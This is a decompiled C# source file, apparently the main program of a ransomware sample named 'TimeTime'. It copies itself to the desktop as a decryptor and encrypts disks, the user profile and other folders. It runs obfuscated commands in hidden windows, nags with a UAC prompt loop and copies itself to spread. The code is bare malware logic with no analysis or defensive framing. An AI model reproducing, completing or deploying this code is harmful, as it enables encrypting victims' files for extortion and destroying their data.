using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace TimeTime;

internal static class Program
{
	private static void DoStuff()
	{
		try
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + Class0.string_46 + Settings.decryptor_file_name);
			Cryptor.EncryptDisks();
			Cryptor.TryEncryptFolder(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
			Cryptor.EncryptFolder(Class0.string_47);
		}
		catch (Exception)
		{
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = Class0.string_48,
			Arguments = Class0.string_49 + commands,
			WindowStyle = ProcessWindowStyle.Hidden
		};
		process.Start();
		process.WaitForExit();
	}

	private static void RunItself(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = Application.get_ExecutablePath(),
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			WorkingDirectory = Path.GetDirectoryName(Application.get_ExecutablePath())
		};
		process.Start();
	}

	private static byte[] RandomBytes(int l)
	{
		Random random = new Random();
		byte[] array = new byte[l];
		for (int i = 0; i < l; i++)
		{
			array[i] = (byte)random.Next(0, random.Next(10, 1000));
		}
		return array;
	}

	private static void Security()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		folderPath = folderPath + Class0.string_50 + Settings.security_vaccine;
		if (!File.Exists(folderPath))
		{
			RunItself(Class0.string_51);
		}
	}

	private static void MainThing()
	{
		Security();
		FileManager.Init();
		string[] files = FileManager.GetFiles();
		foreach (string item in files)
		{
			try
			{
				if (!Cryptor.encr_files.Contains(item))
				{
					Cryptor.encr_files.Add(item);
				}
			}
			catch (Exception)
			{
			}
		}
		try
		{
			Thread thread = new Thread(DoStuff);
			thread.Start();
		}
		catch (Exception)
		{
			DoStuff();
		}
		Thread.Sleep(8000);
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Form1());
	}

	[STAThread]
	private static void Main()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		folderPath = folderPath + Class0.string_52 + Settings.security_vaccine;
		string[] commandLineArgs = Environment.GetCommandLineArgs();
		if (commandLineArgs.Length > 1)
		{
			if (commandLineArgs[1] == Class0.string_53)
			{
				runCommand(Class0.string_54);
				runCommand(Class0.string_55);
				runCommand(Class0.string_56);
				File.WriteAllBytes(folderPath, RandomBytes(512));
			}
			if (commandLineArgs[1] == Class0.string_57)
			{
				Utils.uac_loop(Class0.string_58);
				Environment.Exit(0);
			}
			if (commandLineArgs[1] == Class0.string_59)
			{
				MainThing();
			}
			Environment.Exit(0);
		}
		if (File.Exists(folderPath))
		{
			MainThing();
		}
		else
		{
			Utils.CopyItself();
		}
	}
}
